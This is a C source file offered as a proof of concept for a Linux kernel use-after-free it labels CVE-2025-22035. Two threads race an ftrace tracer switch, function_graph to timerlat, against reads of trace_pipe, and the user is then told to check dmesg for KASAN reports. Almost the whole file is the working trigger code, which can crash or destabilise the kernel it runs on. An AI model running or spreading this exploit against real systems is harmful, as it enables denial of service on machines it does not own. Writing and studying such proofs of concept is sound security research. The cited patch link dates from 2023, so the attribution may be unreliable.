// SPDX-License-Identifier: GPL-2.0
/*
 * CVE-2025-22035 - Linux Kernel Use-After-Free Proof-of-Concept
 * Educational Use Only - Matches EXACT vulnerability conditions from:
 * https://lore.kernel.org/all/20231112150030.84609-1-ryncsn@gmail.com/
 *
 * Vulnerability Conditions:
 * 1. Switch from function_graph to timerlat tracer
 * 2. Concurrent read() from trace_pipe during switch
 * 3. mdelay(10) race window after mutex_unlock
 *
 * Compile: gcc -o cve-2025-22035-poc cve-2025-22035-poc.c -lpthread -O2 -Wall
 */

#define _GNU_SOURCE
#include <fcntl.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <sys/syscall.h>

#define TRACE_PATH "/sys/kernel/debug/tracing/"
#define RACE_WINDOW_US 10000  // 10ms to match mdelay(10)
#define MAX_RUNTIME_SEC 5

static volatile sig_atomic_t stop_race = 0;

void handle_signal(int sig) {
    stop_race = 1;
}

void setup_tracing() {
    // Reset tracing environment
    system("echo 0 > " TRACE_PATH "tracing_on");
    system("echo > " TRACE_PATH "trace");
    system("echo function > " TRACE_PATH "current_tracer");
}

void *tracer_switcher(void *arg) {
    // Synchronize with reader thread
    usleep(RACE_WINDOW_US/2);

    // Exact vulnerable sequence
    system("echo function_graph > " TRACE_PATH "current_tracer");
    usleep(RACE_WINDOW_US);  // Critical race window
    system("echo timerlat > " TRACE_PATH "current_tracer");

    return NULL;
}

void *trace_reader(void *arg) {
    char buf[1024];
    int fd = open(TRACE_PATH "trace_pipe", O_RDONLY | O_NONBLOCK);

    if (fd < 0) {
        perror("[-] Failed to open trace_pipe");
        return NULL;
    }

    // Trigger UAF by reading during switch
    while (!stop_race && read(fd, buf, sizeof(buf)) > 0);

    close(fd);
    return NULL;
}

int main() {
    pthread_t switcher, reader;
    struct sigaction sa;

    printf("[+] CVE-2025-22035 PoC - Educational Use Only\n");

    // Setup signal handler for clean exit
    sa.sa_handler = handle_signal;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;
    sigaction(SIGINT, &sa, NULL);

    // Initialize tracing
    setup_tracing();

    // Create race threads
    if (pthread_create(&reader, NULL, trace_reader, NULL) ||
        pthread_create(&switcher, NULL, tracer_switcher, NULL)) {
        perror("[-] Thread creation failed");
        return EXIT_FAILURE;
    }

    // Run for limited time
    printf("[+] Triggering race for %d seconds...\n", MAX_RUNTIME_SEC);
    sleep(MAX_RUNTIME_SEC);
    stop_race = 1;

    // Cleanup
    pthread_join(switcher, NULL);
    pthread_join(reader, NULL);
    setup_tracing();

    printf("[!] Verification:\n"
           "    1. Check kernel logs: dmesg | grep -i 'use-after-free\\|graph_trace'\n"
           "    2. Look for KASAN reports (if enabled)\n"
           "    3. System stability check - reboot if unstable\n");

    return EXIT_SUCCESS;
}
